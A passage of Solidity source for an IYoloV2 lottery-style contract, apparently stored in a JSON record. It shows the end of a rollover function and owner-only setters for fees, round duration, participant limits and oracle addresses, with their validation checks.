_validateArrayLengthIsNotEmpty(depositIndicesLength);\n\n            for (uint256 j; j < depositIndicesLength; ++j) {\n                uint256 index = depositIndices[j];\n                _validateDepositsArrayIndex(index, cancelledOrDrawnRound);\n\n                Deposit storage singleDeposit = cancelledOrDrawnRound.deposits[index];\n\n                _validateDepositNotWithdrawn(singleDeposit);\n\n                if (singleDeposit.tokenType != YoloV2__TokenType.ETH) {\n                    revert InvalidTokenType();\n                }\n\n                if (status == RoundStatus.Cancelled) {\n                    _validateMsgSenderIsDepositor(singleDeposit);\n                }\n\n                singleDeposit.withdrawn = true;\n\n                rolloverAmount += singleDeposit.tokenAmount;\n            }\n        }\n\n        if (protocolFeeOwed != 0) {\n            if (payWithLOOKS) {\n                protocolFeeOwed = _protocolFeeOwedInLOOKS(protocolFeeOwed);\n                transferManager.transferERC20(LOOKS, msg.sender, protocolFeeRecipient, protocolFeeOwed);\n\n                emit ProtocolFeePayment(protocolFeeOwed, LOOKS);\n            } else {\n                if (rolloverAmount < protocolFeeOwed) {\n                    revert ProtocolFeeNotPaid();\n                } else {\n                    unchecked {\n                        rolloverAmount -= protocolFeeOwed;\n                    }\n                }\n\n                _transferETHAndWrapIfFailWithGasLimit(WETH, protocolFeeRecipient, protocolFeeOwed, gasleft());\n\n                emit ProtocolFeePayment(protocolFeeOwed, address(0));\n            }\n        }\n\n        uint256 roundId = roundsCount;\n        Round storage round = rounds[roundId];\n        _validateRoundIsOpen(round);\n\n        _incrementUserDepositCount(roundId, round);\n        _setCutoffTimeIfNotSet(round);\n\n        uint256 roundValuePerEntry = round.valuePerEntry;\n        uint256 dust = rolloverAmount % roundValuePerEntry;\n        if (dust != 0) {\n            unchecked {\n                rolloverAmount -= dust;\n            }\n            _transferETHAndWrapIfFailWithGasLimit(WETH, msg.sender, dust, gasleft());\n        }\n\n        if (rolloverAmount < roundValuePerEntry) {\n            revert InvalidValue();\n        }\n\n        uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, rolloverAmount);\n\n        if (_shouldDrawWinner(round.numberOfParticipants, round.maximumNumberOfParticipants, round.deposits.length)) {\n            _drawWinner(round, roundId);\n        }\n\n        emit Rollover(msg.sender, withdrawalCalldata, roundId, entriesCount);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function togglePaused() external {\n        _validateIsOwner();\n        paused() ? _unpause() : _pause();\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function toggleOutflowAllowed() external {\n        _validateIsOwner();\n        bool _outflowAllowed = outflowAllowed;\n        outflowAllowed = !_outflowAllowed;\n        emit OutflowAllowedUpdated(!_outflowAllowed);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateCurrenciesStatus(address[] calldata currencies, bool isAllowed) external {\n        _validateIsOperator();\n\n        uint256 count = currencies.length;\n        for (uint256 i; i < count; ++i) {\n            isCurrencyAllowed[currencies[i]] = (isAllowed ? 1 : 0);\n        }\n        emit CurrenciesStatusUpdated(currencies, isAllowed);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateRoundDuration(uint40 _roundDuration) external {\n        _validateIsOwner();\n        _updateRoundDuration(_roundDuration);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateSignatureValidityPeriod(uint40 _signatureValidityPeriod) external {\n        _validateIsOwner();\n        _updateSignatureValidityPeriod(_signatureValidityPeriod);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateValuePerEntry(uint96 _valuePerEntry) external {\n        _validateIsOwner();\n        _updateValuePerEntry(_valuePerEntry);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateProtocolFeeRecipient(address _protocolFeeRecipient) external {\n        _validateIsOwner();\n        _updateProtocolFeeRecipient(_protocolFeeRecipient);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateProtocolFeeBp(uint16 _protocolFeeBp) external {\n        _validateIsOwner();\n        _updateProtocolFeeBp(_protocolFeeBp);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateProtocolFeeDiscountBp(uint16 _protocolFeeDiscountBp) external {\n        _validateIsOwner();\n        _updateProtocolFeeDiscountBp(_protocolFeeDiscountBp);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateMaximumNumberOfParticipantsPerRound(uint40 _maximumNumberOfParticipantsPerRound) external {\n        _validateIsOwner();\n        _updateMaximumNumberOfParticipantsPerRound(_maximumNumberOfParticipantsPerRound);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateReservoirOracle(address _reservoirOracle) external {\n        _validateIsOwner();\n        _updateReservoirOracle(_reservoirOracle);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function updateERC20Oracle(address _erc20Oracle) external {\n        _validateIsOwner();\n        _updateERC20Oracle(_erc20Oracle);\n    }\n\n    /**\n     * @param _roundDuration The duration of each round.\n     */\n    function _updateRoundDuration(uint40 _roundDuration) private {\n        if (_roundDuration > 1 hours) {\n            revert InvalidRoundDuration();\n        }\n\n        roundDuration = _roundDuration;\n        emit RoundDurationUpdated(_roundDuration);\n    }\n\n    /**\n     * @param _signatureValidityPeriod The validity period of a Reservoir signature.\n     */\n    function _updateSignatureValidityPeriod(uint40 _signatureValidityPeriod) private {\n        signatureValidityPeriod = _signatureValidityPeriod;\n        emit SignatureValidityPeriodUpdated(_signatureValidityPeriod);\n    }\n\n    /**\n     * @param _valuePerEntry The value of each entry in ETH.\n     */\n    function _updateValuePerEntry(uint96 _valuePerEntry) private {\n        if (_valuePerEntry == 0) {\n            revert InvalidValue();\n        }\n        valuePerEntry = _valuePerEntry;\n        emit ValuePerEntryUpdated(_valuePerEntry);\n    }\n\n    /**\n     * @param _protocolFeeRecipient The new protocol fee recipient address\n     */\n    function _updateProtocolFeeRecipient(address _protocolFeeRecipient) private {\n        if (_protocolFeeRecipient == address(0)) {\n            revert InvalidValue();\n        }\n        protocolFeeRecipient = _protocolFeeRecipient;\n        emit ProtocolFeeRecipientUpdated(_protocolFeeRecipient);\n    }\n\n    /**\n     * @param _protocolFeeBp The new protocol fee in basis points\n     */\n    function _updateProtocolFeeBp(uint16 _protocolFeeBp) private {\n        if (_protocolFeeBp > MAXIMUM_PROTOCOL_FEE_BP) {\n            revert InvalidValue();\n        }\n        protocolFeeBp = _protocolFeeBp;\n        emit ProtocolFeeBpUpdated(_protocolFeeBp);\n    }\n\n    /**\n     * @param _protocolFeeDiscountBp The new protocol fee in basis points\n     */\n    function _updateProtocolFeeDiscountBp(uint16 _protocolFeeDiscountBp) private {\n        if (_protocolFeeDiscountBp > 10_000) {\n            revert InvalidValue();\n        }\n        protocolFeeDiscountBp = _protocolFeeDiscountBp;\n        emit ProtocolFeeDiscountBpUpdated(_protocolFeeDiscountBp);\n    }\n\n    /**\n     * @param _maximumNumberOfParticipantsPerRound The new maximum number of participants per round\n     */\n    function _updateMaximumNumberOfParticipantsPerRound(uint40 _maximumNumberOfParticipantsPerRound) private {\n        if (_maximumNumberOfParticipantsPerRound < 2) {\n            revert InvalidValue();\n        }\n        maximumNumberOfParticipantsPerRound = _maximumNumberOfParticipantsPerRound;\n        emit MaximumNumberOfParticipantsPerRoundUpdated(_maximumNumberOfParticipantsPerRound);\n    }\n\n    /**\n     * @param _reservoirOracle The new Reservoir oracle address\n     */\n    function _updateReservoirOracle(address _reservoirOracle) private {\n        if (_reservoirOracle == address(0)) {\n            revert InvalidValue();\n        }\n        reservoirOracle = _reservoirOracle;\n        emit ReservoirOracleUpdated(_reservoirOracle);\n    }\n\n    /**\n     * @param _erc20Oracle The new ERC-20 oracle address\n     */\n    function _updateERC20Oracle"
    }
  ]
}